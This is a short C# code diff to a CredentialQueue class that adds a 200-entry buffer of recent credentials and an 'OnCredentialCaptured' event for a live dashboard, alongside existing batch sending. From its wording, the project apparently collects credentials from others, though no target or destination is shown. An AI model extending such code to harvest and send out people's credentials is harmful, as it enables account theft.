@@ -1,6 +1,5 @@
 using System.Collections.Concurrent;
 using System.Text;
-using System.Text;
 using System.Text.Json;
 
 namespace Oracle.Shared;
@@ -18,6 +17,23 @@ public class CredentialQueue : IDisposable
     private long _totalEnqueued;
     private long _totalSent;
     private long _totalFailed;
+
+    // Recent credentials for Dashboard (keeps last 200)
+    private readonly ConcurrentQueue<Credential> _recent = new();
+    private const int MaxRecent = 200;
+
+    /// <summary>
+    /// Fired when a credential is enqueued. Used for Dashboard real-time display.
+    /// </summary>
+    public event Action<Credential>? OnCredentialCaptured;
+
+    /// <summary>
+    /// Returns a snapshot of recent credentials.
+    /// </summary>
+    public List<Credential> GetRecentCredentials()
+    {
+        return _recent.ToList();
+    }
 
     public CredentialQueue(OracleConfig config)
     {
@@ -39,6 +55,14 @@ public class CredentialQueue : IDisposable
     {
         _queue.Enqueue(credential);
         Interlocked.Increment(ref _totalEnqueued);
+
+        // Store in recent list for Dashboard
+        _recent.Enqueue(credential);
+        while (_recent.Count > MaxRecent)
+            _recent.TryDequeue(out _);
+
+        // Notify Dashboard
+        OnCredentialCaptured?.Invoke(credential);
 
         if (_queue.Count >= _config.BatchSize)
             await FlushAsync();
